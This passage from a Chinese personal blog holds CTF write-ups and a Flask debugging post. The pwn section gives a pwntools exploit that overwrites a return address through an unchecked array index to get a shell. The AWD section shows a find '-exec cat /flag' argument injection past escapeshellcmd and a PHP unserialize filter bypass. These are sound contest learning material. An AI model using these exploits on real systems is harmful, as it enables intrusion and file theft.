class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">          <span class="keyword">if</span> ( v6 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Give me your number"</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">          <span class="keyword">if</span> ( j &lt;= <span class="number">0x63</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 = j++;</span><br><span class="line">            v13[v3] = v7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"id\t\tnumber"</span>);</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; j; ++k )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"%d\t\t%d\n"</span>, k, v13[k]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"which number to change:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"new number:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">      v13[v5] = v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; j; ++l )</span><br><span class="line">      v9 += v13[l];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>分析程序可以看出程序的逻辑大体是输入一堆数，然后可以求平均值，也可以添加数字，或者更改某一位。数字默认被存入一个数组中。其中在更改某一位数字的操作中可以看到并没有被传入的下标做检测，这就导致了我们可以在任意位置写入数据，从而更改掉main函数的返回地址从而实现getshell。而且这里存在一个hackhere函数:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hackhere</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/bash"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>所以最初的尝试是将retaddr覆盖为hackhere函数的地址。</p>
<h2 id="分析偏移量"><a href="#分析偏移量" class="headerlink" title="分析偏移量"></a>分析偏移量</h2><p>这里分析偏移量采用了ida动态调试的方法，在main函数的retn处下断点。为了方便找到数组的地址，在调试时先输入4个数字1,2,3,4，然后在stack view中寻找数组的首地址。<br>执行到断点处stack view视图默认指向esp的位置，可以从而确定retaddr：<br><img src="http://p7lc13qga.bkt.clouddn.com/retaddr.png" alt="retaddr"><br>这里的retaddr为<code>0xffcd968c</code><br>向上寻找看是否存在某段内容为04030201，即可找到v13数组的首地址：<br><img src="http://p7lc13qga.bkt.clouddn.com/bufaddr.png" alt="bufaddr"><br>可以看到数组地址为<code>0xffcd9608</code>,数组相对retaddr的偏移位数为<code>0xffcd968c-0xffcd9608=132</code>,所以只要覆盖v13[132]至v13[135]即可。<br>确定hackhere的地址为<code>0x0804859B</code>,所以只需覆盖v13[132]至v13[135]为<code>0x9b</code>,<code>0x85</code>,<code>0x04</code>,<code>0x08</code>.<br>本地测试用这样的方法可成功getshell。</p>
<h2 id="远程的问题"><a href="#远程的问题" class="headerlink" title="远程的问题"></a>远程的问题</h2><p>然而远程测试则提示bash not found.原来目标机器上并不存在bash。因此想要getshell就只能通过调用_system来实现最终的getshell。而这里的<code>/bin/sh</code>可以从<code>/bin/bash</code>中获得，即<code>/bin/bash</code>的倒数二位。<br>因此最后打通远端服务器的payload为:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"47.96.239.28"</span>, <span class="string">'2333'</span>)</span><br><span class="line">r.sendline(<span class="string">'1\n5\n3\n132\n80\n3\n133\n132\n3\n134\n4\n3\n135\n8\n3\n140\n135\n3\n141\n137\n3\n142\n4\n3\n143\n8'</span>)</span><br><span class="line">r.sendline(<span class="string">'5'</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
<p><img src="http://p7lc13qga.bkt.clouddn.com/getshell.png" alt="getshell"></p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>对于pwn菜鸡来说一定要熟悉程序执行的原理才行，另外ida远程调试也是一个很好的办法，更加形象化。另外这里的ida是在wine下运行的portable版本，亲测没有什么大bug。<br>keep calm and carry on！</p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/flask自定义decorator的坑点/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/flask自定义decorator的坑点/index.html" itemprop="url">
                  flask自定义decorator的坑点
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-06-28 01:23:54" itemprop="dateCreated datePublished" datetime="2018-06-28T01:23:54+08:00">2018-06-28</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
              
            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="flask自定义decorator的坑点"><a href="#flask自定义decorator的坑点" class="headerlink" title="flask自定义decorator的坑点"></a>flask自定义decorator的坑点</h2><p>在一次开发中需要做一个权限验证的修饰器，由于之前并没有太多的flask编程经验，没有写过这种修饰器，于是便直接写出了以下的代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_admin</span><span class="params">(func)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args,**kargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session[<span class="string">'is_admin'</span>]:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">'/admin/login'</span>)</span><br><span class="line">        <span class="keyword">return</span> func(args,kargs)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br></pre></td></tr></table></figure>
<p>写完后直接运行报错：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">existing endpoint function: %s&apos; % endpoint)</span><br><span class="line">AssertionError: View function mapping is overwriting an existing endpoint function: admin.wrapper</span><br></pre></td></tr></table></figure>
<p>一开始的时候百思不得其解，并不懂这个错误出现的原因。后来联系报错的提示为已经存在了一个注册过的函数admin.wrapper.<br>可以判断为，经过修饰器修饰后，当传入flask自己的修饰器后修饰器获取到的当前函数的名称为wrapper，所以所有被这个修饰器修饰过得函数传入flask的修饰器中获取到的函数名都是wrapper，因此产生了冲突从而报错。</p>
<p>查看报错的地方的源码，位于<em>app.py</em>中：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_url_rule</span><span class="params">(self, rule, endpoint=None, view_func=None,</span></span></span><br><span class="line"><span class="function"><span class="params">                 provide_automatic_options=None, **options)</span>:</span></span><br><span class="line">    <span class="string">"""Connects a URL rule.  Works exactly like the :meth:`route`</span></span><br><span class="line"><span class="string">    decorator.  If a view_func is provided it will be registered with the</span></span><br><span class="line"><span class="string">    endpoint.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Basically this example::</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @app.route('/')</span></span><br><span class="line"><span class="string">        def index():</span></span><br><span class="line"><span class="string">            pass</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Is equivalent to the following::</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        def index():</span></span><br><span class="line"><span class="string">            pass</span></span><br><span class="line"><span class="string">        app.add_url_rule('/', 'index', index)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    If the view_func is not provided you will need to connect the endpoint</span></span><br><span class="line"><span class="string">    to a view function like so::</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        app.view_functions['index'] = index</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Internally :meth:`route` invokes :meth:`add_url_rule` so if you want</span></span><br><span class="line"><span class="string">    to customize the behavior via subclassing you only need to change</span></span><br><span class="line"><span class="string">    this method.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    For more information refer to :ref:`url-route-registrations`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 0.2</span></span><br><span class="line"><span class="string">       `view_func` parameter added.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 0.6</span></span><br><span class="line"><span class="string">       ``OPTIONS`` is added automatically as method.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param rule: the URL rule as string</span></span><br><span class="line"><span class="string">    :param endpoint: the endpoint for the registered URL rule.  Flask</span></span><br><span class="line"><span class="string">                     itself assumes the name of the view function as</span></span><br><span class="line"><span class="string">                     endpoint</span></span><br><span class="line"><span class="string">    :param view_func: the function to call when serving a request to the</span></span><br><span class="line"><span class="string">                      provided endpoint</span></span><br><span class="line"><span class="string">    :param provide_automatic_options: controls whether the ``OPTIONS``</span></span><br><span class="line"><span class="string">        method should be added automatically. This can also be controlled</span></span><br><span class="line"><span class="string">        by setting the ``view_func.provide_automatic_options = False``</span></span><br><span class="line"><span class="string">        before adding the rule.</span></span><br><span class="line"><span class="string">    :param options: the options to be forwarded to the underlying</span></span><br><span class="line"><span class="string">                    :class:`~werkzeug.routing.Rule` object.  A change</span></span><br><span class="line"><span class="string">                    to Werkzeug is handling of method options.  methods</span></span><br><span class="line"><span class="string">                    is a list of methods this rule should be limited</span></span><br><span class="line"><span class="string">                    to (``GET``, ``POST`` etc.).  By default a rule</span></span><br><span class="line"><span class="string">                    just listens for ``GET`` (and implicitly ``HEAD``).</span></span><br><span class="line"><span class="string">                    Starting with Flask 0.6, ``OPTIONS`` is implicitly</span></span><br><span class="line"><span class="string">                    added and handled by the standard request handling.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> endpoint <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        endpoint = _endpoint_from_view_func(view_func)</span><br><span class="line">    options[<span class="string">'endpoint'</span>] = endpoint</span><br><span class="line">    methods = options.pop(<span class="string">'methods'</span>, <span class="keyword">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if the methods are not given and the view_func object knows its</span></span><br><span class="line">    <span class="comment"># methods we can use that instead.  If neither exists, we go with</span></span><br><span class="line">    <span class="comment"># a tuple of only ``GET`` as default.</span></span><br><span class="line">    <span class="keyword">if</span> methods <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        methods = getattr(view_func, <span class="string">'methods'</span>, <span class="keyword">None</span>) <span class="keyword">or</span> (<span class="string">'GET'</span>,)</span><br><span class="line">    <span class="keyword">if</span> isinstance(methods, string_types):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">'Allowed methods have to be iterables of strings, '</span></span><br><span class="line">                        <span class="string">'for example: @app.route(..., methods=["POST"])'</span>)</span><br><span class="line">    methods = set(item.upper() <span class="keyword">for</span> item <span class="keyword">in</span> methods)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Methods that should always be added</span></span><br><span class="line">    required_methods = set(getattr(view_func, <span class="string">'required_methods'</span>, ()))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># starting with Flask 0.8 the view_func object can disable and</span></span><br><span class="line">    <span class="comment"># force-enable the automatic options handling.</span></span><br><span class="line">    <span class="keyword">if</span> provide_automatic_options <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        provide_automatic_options = getattr(view_func,</span><br><span class="line">            <span class="string">'provide_automatic_options'</span>, <span class="keyword">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> provide_automatic_options <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'OPTIONS'</span> <span class="keyword">not</span> <span class="keyword">in</span> methods:</span><br><span class="line">            provide_automatic_options = <span class="keyword">True</span></span><br><span class="line">            required_methods.add(<span class="string">'OPTIONS'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            provide_automatic_options = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Add the required methods now.</span></span><br><span class="line">    methods |= required_methods</span><br><span class="line"></span><br><span class="line">    rule = self.url_rule_class(rule, methods=methods, **options)</span><br><span class="line">    rule.provide_automatic_options = provide_automatic_options</span><br><span class="line"></span><br><span class="line">    self.url_map.add(rule)</span><br><span class="line">    <span class="keyword">if</span> view_func <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">        old_func = self.view_functions.get(endpoint)</span><br><span class="line">        <span class="keyword">if</span> old_func <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span> <span class="keyword">and</span> old_func != view_func:</span><br><span class="line">            <span class="keyword">raise</span> AssertionError(<span class="string">'View function mapping is overwriting an '</span></span><br><span class="line">                                 <span class="string">'existing endpoint function: %s'</span> % endpoint)</span><br><span class="line">        self.view_functions[endpoint] = view_func</span><br></pre></td></tr></table></figure>
<p>这里的view_functions是一个dict，存储endpoint-view_func键值对。而endpoint是指一个标记各个url的一个字符串，通常为函数的名称。endpoint与不同的函数一一对应。<br>出错的原因在于相同的endpoint被指向了两次，且指向的函数不同，但是这两个不同的函数却拥有相同的名字<strong><strong>name</strong></strong>，因此便对应了相同的endpoint。所以便导致了重复出现的错误。</p>
<p>那么怎么解决这个问题？这里使用了一个叫做functools的库中定义的一个修饰器@functool.wraps.<br>更改后的代码为:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_admin</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">    @functools.wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args,**kargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session[<span class="string">'is_admin'</span>]:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">'/admin/login'</span>)</span><br><span class="line">        <span class="keyword">return</span> func(args,kargs)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br></pre></td></tr></table></figure></p>
<p>再次调试可以看到这次程序运行后对应的函数的<strong>name</strong>不同，从而没有再出现bug。再次调试可以发现最后的函数的<strong>name</strong>与对应的endpoint值均不同。</p>
<p>注：@functools.wraps(func)的作用就是保留原有函数的名称和docstring</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://segmentfault.com/a/1190000006658289">记录一次使用Flask开发过程中的bug</a></p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>经过这次拍错发现自己对flask的实现机制产生了浓厚的兴趣。。。。那就立个flag，今年要把flask的源码好好看一看，至少弄懂flask背后的设计原理。</p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/红帽杯线下赛AWD题目分析/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/红帽杯线下赛AWD题目分析/index.html" itemprop="url">
                  红帽杯线下赛AWD题目分析
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-06-03 15:37:47" itemprop="dateCreated datePublished" datetime="2018-06-03T15:37:47+08:00">2018-06-03</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="红帽杯线下赛"><a href="#红帽杯线下赛" class="headerlink" title="红帽杯线下赛"></a>红帽杯线下赛</h2><p>上周打了一场红帽杯的线下赛,可惜开具发挥失误服务器down了几轮一度垫底…最后才又勉强上了点儿分…..赛后对题目中的几处比较有意义的漏洞做了一下分析,写出了下面篇文章.</p>
<p>红帽杯线下赛web原题已同步到我社github上:<a href="https://github.com/susers/Writeups">https://github.com/susers/Writeups</a></p>
<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>web1是一个wordpress的应用程序,可惜当时比赛刚开始时服务器上的权限设置并不能直接修复程序,所以就先去搞了web2.后来传了一个马上去才修复了一些权限的问题,其他的漏洞基本上是通过抓包来搞出来的….这里贴一些赛后看各路大佬writeup等感觉不错的漏洞点:</p>
<h3 id="命令执行1-escapeshellcmd绕过"><a href="#命令执行1-escapeshellcmd绕过" class="headerlink" title="命令执行1 escapeshellcmd绕过"></a>命令执行1 escapeshellcmd绕过</h3><p>在/wp-login.php中:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'debug'</span>:</span><br><span class="line">        $file = addslashes($_POST[<span class="string">'file'</span>]);</span><br><span class="line">        system(<span class="string">"find /tmp -iname "</span>.escapeshellcmd($file));</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>先看一下escapeshellcmd的说明:</p>
<p><img src="http://p7lc13qga.bkt.clouddn.com/escapeshellcmd.png" alt="escapeshellcmd"></p>
<p>可以看到escapeshellcmd的主要功能是对可以截断shell命令的字符进行转义.</p>
<p>然而这里的语句倍拼接到了find命令下,而find命令有一个参数是exec参数,可移执行命令,因此我们这里便可以利用find命令的exec参数来bypass.</p>
<p>find exec参数执行的示例:</p>
<p><img src="http://p7lc13qga.bkt.clouddn.com/find1.png" alt="find1"></p>
<p>然而这里报缺少参数,是因为-exec传入的指令需要有结束符,分号必不可少,且分号应该加上反斜杠防止歧义.</p>
<p><img src="http://p7lc13qga.bkt.clouddn.com/find2.png" alt="find2"></p>
<p>这里看到命令被循环执行了,于是我们加上-quit只打印一次:</p>
<p><img src="http://p7lc13qga.bkt.clouddn.com/find3.png" alt="find3"></p>
<p>因此利用这样的指令便可以读文件.poc为:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=xxx -or -exec cat /flag ; quit</span><br></pre></td></tr></table></figure>
<p>这里不加反斜杠是因为escapeshellcmd会给我们的参数自动加上反斜杠.</p>
<h3 id="命令执行2"><a href="#命令执行2" class="headerlink" title="命令执行2"></a>命令执行2</h3><p>在wp-includes/class-wp-cachefile.php中:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cacheFile = <span class="string">'/tmp/cachefile'</span>;</span><br><span class="line">    <span class="keyword">public</span> $template = <span class="string">'&lt;div&gt;Welcome back %s&lt;/div&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data = null)</span> </span>&#123;</span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;loadData($data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;render($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadData</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">2</span>) !== <span class="string">'O:'</span></span><br><span class="line">        &amp;&amp; !preg_match(<span class="string">'/O:\d:\/'</span>, $data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> unserialize($data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createCache</span><span class="params">($file = null, $tpl = null)</span> </span>&#123;</span><br><span class="line">        $file = $file ?? <span class="keyword">$this</span>-&gt;cacheFile;</span><br><span class="line">        $tpl = $tpl ?? <span class="keyword">$this</span>-&gt;template;</span><br><span class="line">        file_put_contents($file, $tpl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> sprintf(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;template,</span><br><span class="line">            htmlspecialchars($data[<span class="string">'name'</span>])</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;createCache();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Template($_COOKIE[<span class="string">'data'</span>]);</span><br></pre></td></tr></table></figure></p>
<p>这里可以看到构造函数中调用了loadData来对传入的cookie值进行序列化,而loadData函数中对传入的参数进行了两个过滤:</p>
<ul>
<li><strong>substr($data,0,2)!==’O:’</strong><br>可以通过序列化一个数组,数组中的元素为类来绕过.</li>
<li><strong>!preg_match(‘/O:\d:\/‘, $data)</strong><br>可以通过正号来绕过匹配.</li>
</ul>
<p>在template类中的析构函数中调用了createCache方法,createCache方法中可以任意写入文件.<br>因此构造payload的poc为:</p>
